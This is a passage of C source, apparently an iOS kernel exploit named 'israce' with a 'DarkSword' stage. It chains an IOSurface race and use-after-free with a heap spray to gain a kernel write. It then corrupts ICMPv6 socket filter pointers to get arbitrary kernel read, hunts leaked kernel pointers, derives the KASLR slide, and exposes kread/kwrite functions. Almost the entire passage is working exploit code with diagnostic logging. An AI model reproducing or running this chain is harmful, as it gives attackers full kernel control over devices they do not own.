                              info, (int)sizeof(info));
        if (nb <= 0) {
            islog("[ds] %-8s fd=%d FAIL errno=%d", fd_tags[f], probe_fds[f], errno);
            continue;
        }
        int sk = 0;
        for (int i = 0; i + 8 <= nb; i += 8) {
            uint64_t v;
            memcpy(&v, info + i, 8);
            if (ds_is_valid_kptr(v)) {
                bool dup = false;
                for (int d = 0; d < total; d++) if (addrs[d] == v) { dup = true; break; }
                if (dup) continue;
                sk++;
                if (total < max_addrs) {
                    addrs[total++] = v;
                    islog("[ds]   %s kptr: 0x%llx at +%d",
                         fd_tags[f], (unsigned long long)v, i);
                }
            }
        }
        islog("[ds] %-8s fd=%d: %d bytes, %d kptrs", fd_tags[f], probe_fds[f], nb, sk);
    }

    if (total == 0) {
        islog("[ds] ═══ extended kptr probe (all standard channels dead) ═══");

        if (s_ds_sock_a >= 0) {
            uint8_t si[512];
            int nb = proc_pidinfo(getpid(), PROC_PIDFDSOCKETINFO, s_ds_sock_a,
                                  si, (int)sizeof(si));
            if (nb > 0) {
                islog("[ds] proc_pidinfo(sock_a fd=%d): %d bytes", s_ds_sock_a, nb);
                for (int row = 0; row < nb && row < 256; row += 32) {
                    int end = row + 32;
                    if (end > nb) end = nb;
                    char hex[200]; int pos = 0;
                    for (int b = row; b < end; b++)
                        pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", si[b]);
                    islog("[ds]   +%03d: %s", row, hex);
                }
                int soi_so_off = 232;
                int soi_pcb_off = 240;
                if (soi_so_off + 8 <= nb) {
                    uint64_t so; memcpy(&so, si + soi_so_off, 8);
                    islog("[ds]   soi_so  @+%d = 0x%llx %s", soi_so_off, (unsigned long long)so,
                          ds_is_valid_kptr(so) ? "★ KPTR" : (so == 0 ? "(zeroed)" : "(sanitized)"));
                }
                if (soi_pcb_off + 8 <= nb) {
                    uint64_t pcb; memcpy(&pcb, si + soi_pcb_off, 8);
                    islog("[ds]   soi_pcb @+%d = 0x%llx %s", soi_pcb_off, (unsigned long long)pcb,
                          ds_is_valid_kptr(pcb) ? "★ KPTR" : (pcb == 0 ? "(zeroed)" : "(sanitized)"));
                }
            }
        }

        {
            mach_port_t tp = mach_task_self();
            natural_t kotype = 0;
            mach_vm_address_t kaddr = 0;
            kern_return_t kr = mach_port_kernel_object(tp, tp, &kotype, (unsigned int *)&kaddr);
            islog("[ds] mach_port_kernel_object(task_self): kr=%d type=%u addr=0x%llx",
                  kr, kotype, (unsigned long long)kaddr);

            mach_port_t hp;
            kr = task_get_special_port(tp, TASK_HOST_PORT, &hp);
            if (kr == KERN_SUCCESS) {
                kr = mach_port_kernel_object(tp, hp, &kotype, (unsigned int *)&kaddr);
                islog("[ds] mach_port_kernel_object(host): kr=%d type=%u addr=0x%llx",
                      kr, kotype, (unsigned long long)kaddr);
            }
        }

        {
            pid_t pid = getpid();
            int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, pid };
            size_t klen = 0;
            int rc = sysctl(mib, 4, NULL, &klen, NULL, 0);
            islog("[ds] sysctl kern.proc.pid.%d: rc=%d len=%zu errno=%d",
                  pid, rc, klen, rc == 0 ? 0 : errno);
            if (rc == 0 && klen >= 64) {
                uint8_t *kbuf = malloc(klen);
                if (kbuf && sysctl(mib, 4, kbuf, &klen, NULL, 0) == 0) {
                    int kptrs_found = 0;
                    for (size_t i = 0; i + 8 <= klen; i += 8) {
                        uint64_t v; memcpy(&v, kbuf + i, 8);
                        if (ds_is_valid_kptr(v)) {
                            islog("[ds]   kern.proc kptr: 0x%llx at +%zu",
                                  (unsigned long long)v, i);
                            if (total < max_addrs) addrs[total++] = v;
                            if (++kptrs_found >= 8) break;
                        }
                    }
                    if (kptrs_found == 0)
                        islog("[ds]   kern.proc: 0 kptrs in %zu bytes (sanitized)", klen);
                }
                free(kbuf);
            }
        }

        static const char *misc_sysctls[] = {
            "kern.boottime", "kern.waketime", "hw.cacheconfig",
            "hw.cachesize", "hw.pagesize", "net.routetable",
            NULL
        };
        for (int i = 0; misc_sysctls[i]; i++) {
            size_t slen = 0;
            int rc = sysctlbyname(misc_sysctls[i], NULL, &slen, NULL, 0);
            if (rc != 0 || slen < 8) {
                islog("[ds]   %-24s FAIL (rc=%d errno=%d)", misc_sysctls[i], rc, errno);
                continue;
            }
            if (slen > 256) slen = 256;
            uint8_t sbuf[256];
            if (sysctlbyname(misc_sysctls[i], sbuf, &slen, NULL, 0) == 0) {
                int sk = 0;
                for (size_t j = 0; j + 8 <= slen; j += 8) {
                    uint64_t v; memcpy(&v, sbuf + j, 8);
                    if (ds_is_valid_kptr(v)) {
                        islog("[ds]   %s kptr: 0x%llx at +%zu",
                              misc_sysctls[i], (unsigned long long)v, j);
                        if (total < max_addrs) addrs[total++] = v;
                        sk++;
                    }
                }
                if (sk == 0)
                    islog("[ds]   %-24s %zu bytes, 0 kptrs", misc_sysctls[i], slen);
            }
        }
    }

    if (tcp_fd >= 0) close(tcp_fd);
    if (udp_fd >= 0) close(udp_fd);

    if (total > 0) {
        islog("[ds] ★ total %d kptr candidates from all channels", total);
    } else {
        islog("[ds] ✗ VERDICT: 0 kernel pointers from ALL channels — inpcb discovery DEAD");
        islog("[ds] ✗ need alternative: IOSurface stale-read, selector enum, or zone-relative attack");
    }
    return total;
}

static bool ds_kread_32bytes(uint64_t addr, void *out) {
    if (!s_ds_active || s_ds_sock_a < 0 || s_ds_sock_b < 0) return false;

    // setsockopt(A) writes 32 bytes to where A's filter points (= B+0x148)
    // First 8 bytes of our data become B's new icmp6filt pointer = addr
    uint32_t filter_data[8];
    memset(filter_data, 0, sizeof(filter_data));
    memcpy(filter_data, &addr, 8);

    if (setsockopt(s_ds_sock_a, IPPROTO_ICMPV6, ICMP6_FILTER,
                   filter_data, sizeof(filter_data)) < 0) {
        islog("[ds] kread redirect setsockopt(A): %s", strerror(errno));
        return false;
    }

    // getsockopt(B) reads 32 bytes from B's filter pointer = addr
    uint32_t readback[8];
    socklen_t rlen = sizeof(readback);
    if (getsockopt(s_ds_sock_b, IPPROTO_ICMPV6, ICMP6_FILTER,
                   readback, &rlen) < 0) {
        islog("[ds] kread getsockopt(B): %s", strerror(errno));
        return false;
    }

    memcpy(out, readback, 32);
    return true;
}

static uint64_t ds_kread64_internal(uint64_t addr) {
    uint8_t tmp[32];
    if (!ds_kread_32bytes(addr, tmp)) return 0xDEAD000000000000ULL;
    uint64_t val;
    memcpy(&val, tmp, 8);
    return val;
}

#pragma mark - Phase 6: DarkSword activation

static bool phase6_darksword(io_service_t svc, israce_result_t *res) {
    islog("[israce] ═══ Phase 6: DarkSword two-socket kread ═══");

    if (!s_kwrite_active) {
        islog("[ds] no kwrite — cannot activate DarkSword");
        return false;
    }

    s_ds_sock_a = ds_make_sock();
    s_ds_sock_b = ds_make_sock();
    if (s_ds_sock_a < 0 || s_ds_sock_b < 0) {
        islog("[ds] ICMPv6 sockets unavailable — SOCK_RAW sandboxed?");
        if (s_ds_sock_a >= 0) { close(s_ds_sock_a); s_ds_sock_a = -1; }
        if (s_ds_sock_b >= 0) { close(s_ds_sock_b); s_ds_sock_b = -1; }
        return false;
    }

    // Snapshot pcblist AFTER creating both sockets
    uint64_t inpcbs[32];
    int n = ds_find_inpcbs(inpcbs, 32);
    if (n < 2) {
        islog("[ds] need ≥2 inpcbs, found %d", n);
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        return false;
    }

    s_ds_inpcb_a = inpcbs[n - 2];
    s_ds_inpcb_b = inpcbs[n - 1];
    islog("[ds] inpcb_A=0x%llx inpcb_B=0x%llx",
         (unsigned long long)s_ds_inpcb_a,
         (unsigned long long)s_ds_inpcb_b);

    if (s_ds_inpcb_a == s_ds_inpcb_b) {
        islog("[ds] ✗ inpcb_A == inpcb_B — sanitized sentinel, not real");
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        return false;
    }

    uint32_t ph6_baseline[8];
    socklen_t ph6_blen = sizeof(ph6_baseline);
    getsockopt(s_ds_sock_a, IPPROTO_ICMPV6, ICMP6_FILTER, ph6_baseline, &ph6_blen);
    uint64_t ph6_baseline_val;
    memcpy(&ph6_baseline_val, ph6_baseline, 8);

    uint64_t kw_target = s_ds_inpcb_a + KOFF_INPCB_ICMP6FILT;
    uint64_t kw_value  = s_ds_inpcb_b + KOFF_INPCB_ICMP6FILT;

    islog("[ds] kwrite: 0x%llx ← 0x%llx",
         (unsigned long long)kw_target, (unsigned long long)kw_value);

    uint8_t spray_buf[ISRACE_KALLOC_1024_SIZE];
    build_kwrite_spray(spray_buf, kw_target, kw_value);

    for (uint32_t att = 0; att < ISRACE_MAX_ATTEMPTS; att++) {
        islog("[ds] activation attempt %u/%u", att + 1, ISRACE_MAX_ATTEMPTS);

        try_kwrite_once(svc, spray_buf);

        uint32_t check[8];
        socklen_t clen = sizeof(check);
        if (getsockopt(s_ds_sock_a, IPPROTO_ICMPV6, ICMP6_FILTER, check, &clen) == 0) {
            uint64_t readval;
            memcpy(&readval, check, 8);
            islog("[ds] getsockopt(A) → 0x%llx", (unsigned long long)readval);

            if (readval != ph6_baseline_val && ds_is_valid_kptr(readval)) {
                islog("[ds] ★ A→B redirect confirmed: B's filter=0x%llx",
                     (unsigned long long)readval);
                s_ds_active = true;
                break;
            }
        }

        spray_props_cleanup();
        usleep(10000);
    }

    if (!s_ds_active) {
        islog("[ds] DarkSword activation FAILED");
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        return false;
    }

    // Verify kread: read Mach-O magic at kernel base
    uint64_t kbase = 0xFFFFFFF007004000ULL + s_kaslr_slide;
    uint64_t magic = ds_kread64_internal(kbase);
    bool ok = (magic & 0xFFFFFFFF) == 0xFEEDFACF;
    islog("[ds] kread64(0x%llx) = 0x%llx — %s",
         (unsigned long long)kbase, (unsigned long long)magic,
         ok ? "★★★ MACH-O MAGIC ★★★" : "MISMATCH");

    if (ok) {
        res->kread_possible = true;
        islog("[ds] ★★★ DarkSword kread ACTIVE ★★★");
    }

    return ok;
}

#pragma mark - KASLR slide derivation via kread

static void derive_kaslr_slide(israce_result_t *res) {
    if (s_kaslr_slide != 0) {
        islog("[ds] KASLR already set: 0x%llx", (unsigned long long)s_kaslr_slide);
        res->kaslr_slide_derived = s_kaslr_slide;
        return;
    }

    islog("[ds] ═══ KASLR derivation from inpcb structure ═══");

    uint8_t data[256];
    memset(data, 0, sizeof(data));
    for (int i = 0; i < 8; i++) {
        if (!ds_kread_32bytes(s_ds_inpcb_a + (uint64_t)(i * 32), data + i * 32)) {
            islog("[ds] KASLR: kread at inpcb+%d failed", i * 32);
            break;
        }
    }

    static const struct { const char *name; uint64_t addr; } known[] = {
        { "ripcb6_head",  RIPCB6_HEAD_UNSLID  },
        { "hostname_buf", HOSTNAME_UNSLID      },
    };
    static const int nknown = sizeof(known) / sizeof(known[0]);

    for (int off = 0; off + 8 <= 256; off += 8) {
        uint64_t val;
        memcpy(&val, data + off, 8);
        if (!ds_is_valid_kptr(val)) continue;
        if (val == s_ds_inpcb_a || val == s_ds_inpcb_b) continue;

        for (int k = 0; k < nknown; k++) {
            int64_t cs = (int64_t)(val - known[k].addr);
            if (cs < 0 || cs >= 0x200000000LL || (cs & 0x3FFF) != 0) continue;

            uint64_t kbase = 0xFFFFFFF007004000ULL + (uint64_t)cs;
            uint64_t magic = ds_kread64_internal(kbase);
            if ((magic & 0xFFFFFFFF) == 0xFEEDFACF) {
                islog("[ds] ★★★ KASLR slide=0x%llx (from %s @ inpcb+0x%x) ★★★",
                     (unsigned long long)cs, known[k].name, off);
                s_kaslr_slide = (uint64_t)cs;
                res->kaslr_slide_derived = (uint64_t)cs;
                return;
            }
        }
    }

    islog("[ds] KASLR: no BSS match — scanning socket objects...");

    for (int off = 0; off + 8 <= 256; off += 8) {
        uint64_t ptr;
        memcpy(&ptr, data + off, 8);
        if (!ds_is_valid_kptr(ptr)) continue;
        if (ptr == s_ds_inpcb_a || ptr == s_ds_inpcb_b) continue;

        uint8_t obj[256];
        bool ok = true;
        for (int i = 0; i < 8 && ok; i++)
            ok = ds_kread_32bytes(ptr + (uint64_t)(i * 32), obj + i * 32);
        if (!ok) continue;

        for (int j = 0; j + 8 <= 256; j += 8) {
            uint64_t inner;
            memcpy(&inner, obj + j, 8);
            if (!ds_is_valid_kptr(inner)) continue;

            for (int k = 0; k < nknown; k++) {
                int64_t cs = (int64_t)(inner - known[k].addr);
                if (cs < 0 || cs >= 0x200000000LL || (cs & 0x3FFF) != 0) continue;

                uint64_t kbase = 0xFFFFFFF007004000ULL + (uint64_t)cs;
                uint64_t magic = ds_kread64_internal(kbase);
                if ((magic & 0xFFFFFFFF) == 0xFEEDFACF) {
                    islog("[ds] ★★★ KASLR slide=0x%llx (deep: inpcb+0x%x→+0x%x→%s) ★★★",
                         (unsigned long long)cs, off, j, known[k].name);
                    s_kaslr_slide = (uint64_t)cs;
                    res->kaslr_slide_derived = (uint64_t)cs;
                    return;
                }
            }
        }
    }

    islog("[ds] KASLR derivation FAILED — kread/kwrite active without slide");
}

#pragma mark - IOSurface selector kptr probe

static int ds_probe_iosurface_selectors(io_service_t svc, uint64_t *addrs, int max_addrs) {
    islog("[ds] ═══ IOSurface selector enumeration (kptr hunt) ═══");
    int total = 0;

    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
    if (kr != KERN_SUCCESS) {
        islog("[ds] selector probe: IOServiceOpen failed: 0x%x", kr);
        return 0;
    }

    for (uint32_t sel = 0; sel <= 30; sel++) {
        if (sel == 17 || sel == 18) continue;

        uint64_t si[6] = {0, 0, 0, 0, 0, 0};
        uint32_t soc = 6;
        uint8_t out_struct[1024];
        size_t out_struct_sz = sizeof(out_struct);
        memset(out_struct, 0xAA, sizeof(out_struct));

        kr = IOConnectCallMethod(c, sel,
                                 si, 2, NULL, 0,
                                 si, &soc, out_struct, &out_struct_sz);

        if (kr == 0xE00002C2 || kr == 0xE00002C5 || kr == 0xE00002BC) {
            continue;
        }

        if (kr == KERN_SUCCESS || kr == 0xE00002C9) {
            islog("[ds] sel%u: kr=0x%x soc=%u struct_out=%zu", sel, kr, soc, out_struct_sz);

            for (uint32_t i = 0; i < soc && i < 6; i++) {
                if (ds_is_valid_kptr(si[i])) {
                    islog("[ds]   sel%u scalar[%u] = 0x%llx ★ KPTR",
                          sel, i, (unsigned long long)si[i]);
                    if (total < max_addrs) addrs[total++] = si[i];
                }
            }

            for (size_t i = 0; i + 8 <= out_struct_sz; i += 8) {
                uint64_t v;
                memcpy(&v, out_struct + i, 8);
                if (ds_is_valid_kptr(v)) {
                    islog("[ds]   sel%u struct[+%zu] = 0x%llx ★ KPTR",
                          sel, i, (unsigned long long)v);
                    if (total < max_addrs) addrs[total++] = v;
                }
            }
        }
    }

    IOServiceClose(c);

    if (total > 0)
        islog("[ds] ★ selector probe: %d kptrs found!", total);
    else
        islog("[ds] selector probe: 0 kptrs from selectors 0-30");

    return total;
}

#pragma mark - Phase 5: DarkSword Direct (KASLR-independent)

static bool phase5_darksword_direct(io_service_t svc, israce_result_t *res) {
    islog("[israce] ═══ Phase 5: DarkSword Direct (no KASLR needed) ═══");

    s_ds_sock_a = ds_make_sock();
    s_ds_sock_b = ds_make_sock();
    if (s_ds_sock_a < 0 || s_ds_sock_b < 0) {
        islog("[ds] ICMPv6 sockets unavailable");
        if (s_ds_sock_a >= 0) { close(s_ds_sock_a); s_ds_sock_a = -1; }
        if (s_ds_sock_b >= 0) { close(s_ds_sock_b); s_ds_sock_b = -1; }
        return false;
    }

    uint64_t inpcbs[32];
    int n = ds_find_inpcbs(inpcbs, 32);

    if (n < 2) {
        islog("[ds] standard channels: %d inpcbs — trying selector probe...", n);
        int sel_n = ds_probe_iosurface_selectors(svc, inpcbs + n, 32 - n);
        n += sel_n;
    }

    if (n < 2) {
        islog("[ds] ✗ TOTAL %d kptr candidates — need ≥2 for DarkSword", n);
        islog("[ds] ✗ ALL inpcb discovery channels DEAD on this device");
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        return false;
    }

    s_ds_inpcb_a = inpcbs[n - 2];
    s_ds_inpcb_b = inpcbs[n - 1];
    islog("[ds] inpcb_A=0x%llx inpcb_B=0x%llx",
         (unsigned long long)s_ds_inpcb_a,
         (unsigned long long)s_ds_inpcb_b);

    if (s_ds_inpcb_a == s_ds_inpcb_b) {
        islog("[ds] ✗ inpcb_A == inpcb_B — addresses are FAKE (sanitized sentinel)");
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        return false;
    }

    uint32_t baseline[8];
    socklen_t blen = sizeof(baseline);
    getsockopt(s_ds_sock_a, IPPROTO_ICMPV6, ICMP6_FILTER, baseline, &blen);
    uint64_t baseline_val;
    memcpy(&baseline_val, baseline, 8);
    islog("[ds] getsockopt(A) baseline: 0x%llx", (unsigned long long)baseline_val);

    uint64_t kw_target = s_ds_inpcb_a + KOFF_INPCB_ICMP6FILT;
    uint64_t kw_value  = s_ds_inpcb_b + KOFF_INPCB_ICMP6FILT;
    islog("[ds] kwrite plan: *0x%llx = 0x%llx",
         (unsigned long long)kw_target, (unsigned long long)kw_value);

    uint8_t spray_buf[ISRACE_KALLOC_1024_SIZE];
    build_kwrite_spray(spray_buf, kw_target, kw_value);

    for (uint32_t att = 0; att < ISRACE_MAX_ATTEMPTS; att++) {
        islog("[ds] attempt %u/%u", att + 1, ISRACE_MAX_ATTEMPTS);

        try_kwrite_once(svc, spray_buf);

        uint32_t check[8];
        socklen_t clen = sizeof(check);
        if (getsockopt(s_ds_sock_a, IPPROTO_ICMPV6, ICMP6_FILTER,
                       check, &clen) == 0) {
            uint64_t readval;
            memcpy(&readval, check, 8);
            islog("[ds] getsockopt(A) → 0x%llx", (unsigned long long)readval);

            if (readval != baseline_val && ds_is_valid_kptr(readval)) {
                islog("[ds] ★ A→B redirect CONFIRMED: B.filter=0x%llx (changed from 0x%llx)",
                     (unsigned long long)readval, (unsigned long long)baseline_val);
                s_ds_active = true;
                s_kwrite_active = true;
                break;
            }
            if (readval == baseline_val) {
                islog("[ds]   no change from baseline — kwrite didn't land");
            }
        }

        spray_props_cleanup();
        usleep(10000);
    }

    if (!s_ds_active) {
        islog("[ds] DarkSword FAILED — no redirect after %u attempts",
             ISRACE_MAX_ATTEMPTS);
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        return false;
    }

    uint8_t verify_buf[32];
    if (ds_kread_32bytes(s_ds_inpcb_a, verify_buf)) {
        uint64_t first8;
        memcpy(&first8, verify_buf, 8);
        islog("[ds] kread verify: inpcb_A[0:8] = 0x%llx", (unsigned long long)first8);

        if (first8 != 0 && first8 != 0xDEAD000000000000ULL
            && first8 != baseline_val && first8 != 0xFFFFFFFFFFFFFFFFULL) {
            islog("[ds] ★★★ DarkSword kread VERIFIED — heap read OK ★★★");
            res->kread_possible = true;
            res->triggered = true;
            res->reclaimed = true;
            res->kwrite_active = true;
        } else {
            islog("[ds] kread verify REJECTED: value=0x%llx (baseline/sentinel/dead)",
                 (unsigned long long)first8);
        }
    }

    if (!res->kread_possible) {
        islog("[ds] kread NOT confirmed despite redirect");
        close(s_ds_sock_a); close(s_ds_sock_b);
        s_ds_sock_a = s_ds_sock_b = -1;
        s_ds_active = false;
        return false;
    }

    derive_kaslr_slide(res);
    return true;
}

#pragma mark - Public API: kwrite

void israce_set_kwrite_target(uint64_t addr, uint64_t val) {
    (void)addr; (void)val;
}

bool israce_kwrite64(uint64_t addr, uint64_t val) {
    if (!s_kwrite_active) {
        islog("[israce] kwrite64: no primitive");
        return false;
    }

    io_service_t svc = find_service();
    if (!svc) return false;

    uint8_t spray_buf[ISRACE_KALLOC_1024_SIZE];
    build_kwrite_spray(spray_buf, addr, val);

    bool verified = false;
    for (uint32_t att = 0; att < ISRACE_MAX_ATTEMPTS && !verified; att++) {
        try_kwrite_once(svc, spray_buf);
        spray_props_cleanup();

        // Best-effort: if DarkSword is active, verify via kread
        if (s_ds_active) {
            uint64_t readback = ds_kread64_internal(addr);
            if (readback == val) {
                verified = true;
                islog("[israce] kwrite64 VERIFIED: *0x%llx = 0x%llx",
                     (unsigned long long)addr, (unsigned long long)val);
            }
        } else {
            islog("[israce] kwrite64 attempt %u sent (unverified)", att + 1);
        }
    }

    IOObjectRelease(svc);
    return verified || !s_ds_active;
}

bool israce_kwrite32(uint64_t addr, uint32_t val) {
    return israce_kwrite64(addr, (uint64_t)val);
}

bool israce_has_kwrite(void) {
    return s_kwrite_active;
}

#pragma mark - Public API: DarkSword activation

bool israce_activate_darksword(uint64_t slide) {
    s_kaslr_slide = slide;
    io_service_t svc = find_service();
    if (!svc) return false;

    israce_result_t tmp = {0};
    bool ok = phase6_darksword(svc, &tmp);
    IOObjectRelease(svc);
    return ok;
}

#pragma mark - Public API: kread (DarkSword)

uint64_t israce_kread64(uint64_t addr) {
    return ds_kread64_internal(addr);
}

bool israce_kread_32bytes(uint64_t addr, void *out) {
    return ds_kread_32bytes(addr, out);
}

#pragma mark - Public API: cleanup

void israce_cleanup(void) {
    spray_props_cleanup();
    if (s_ds_sock_a >= 0) { close(s_ds_sock_a); s_ds_sock_a = -1; }
    if (s_ds_sock_b >= 0) { close(s_ds_sock_b); s_ds_sock_b = -1; }
    s_ds_active = false;
    s_kwrite_active = false;
    s_ds_inpcb_a = s_ds_inpcb_b = 0;
    islog("[israce] cleanup done");
}

#pragma mark - Main entry point

void israce_run(israce_result_t *result) {
    memset(result, 0, sizeof(*result));
    load_syms();

    io_service_t svc = find_service();
    if (!svc) { islog("[israce] ABORT: no IOSurfaceRoot"); return; }

    // === Phase 0: Calibrate ===
    islog("[israce] ═══ Phase 0: Calibrate ═══");
    bool ok = calibrate(svc);
    if (!ok) {
        islog("[israce] calibration FAILED — sel17 unreachable or patched");
        result->sel17_rc = 0xE00002D8;
        IOObjectRelease(svc);
        return;
    }
    result->sel17_rc = 0;

    // === Phases 1-4: Trigger warmup ===
    islog("[israce] ═══ Phase 1: V_TEARREG ═══");
    try_tearreg(svc, 200, result);

    islog("[israce] ═══ Phase 2: V_LOCKDEG ═══");
    try_lockdeg(svc, 200, result);

    islog("[israce] ═══ Phase 3: REREG+DUALREF ═══");
    try_rereg_dualref(svc, 100, result);

    islog("[israce] ═══ Phase 4: COMBINED ═══");
    try_combined_tearreg(svc, 300, result);

    // === Phase 4.5: Reclaim verification (spray-only, no kwrite target) ===
    phase4_5_reclaim(svc, result);

    // === Phase 5: DarkSword Direct (KASLR-independent kwrite → kread) ===
    // pcblist_n gives heap addresses — no KASLR needed for kwrite + verification
    if (phase5_darksword_direct(svc, result)) {
        islog("[israce] ★★★ FULL CHAIN: kwrite + DarkSword kread ★★★");
        if (result->kaslr_slide_derived != 0) {
            islog("[israce] KASLR derived: 0x%llx",
                 (unsigned long long)result->kaslr_slide_derived);
        } else {
            islog("[israce] WARNING: kread/kwrite active but KASLR slide unknown");
        }
    } else if (s_kaslr_slide != 0) {
        // Fallback: hostname oracle (only when KASLR provided externally)
        islog("[israce] Direct failed — hostname fallback (KASLR=0x%llx)",
             (unsigned long long)s_kaslr_slide);
        if (phase5_kwrite_verify(svc, result)) {
            if (phase6_darksword(svc, result)) {
                islog("[israce] ★★★ FULL CHAIN via hostname fallback ★★★");
            }
        }
    } else {
        result->triggered = true;
        result->panic_averted = 1;
        result->attempts = ISRACE_MAX_ATTEMPTS;
        islog("[israce] all kwrite paths exhausted — need kernel addresses");
        islog("[israce] reclaim=%d spray=%u — spray mechanism %s",
             result->reclaimed, result->reclaim_spray_count,
             result->reclaimed ? "VERIFIED" : "FAILED");
        islog("[israce] A17 Pro (no kMTE): silent UAF = no observable signal");
        islog("[israce] BLOCKER: inpcb discovery dead → no kwrite target → no DarkSword");
    }

    IOObjectRelease(svc);

    islog("[israce] ═══ RESULT: triggered=%d reclaimed=%d kwrite=%d kread=%d att=%u ═══",
         result->triggered, result->reclaimed, result->kwrite_active,
         result->kread_possible, result->attempts);
}
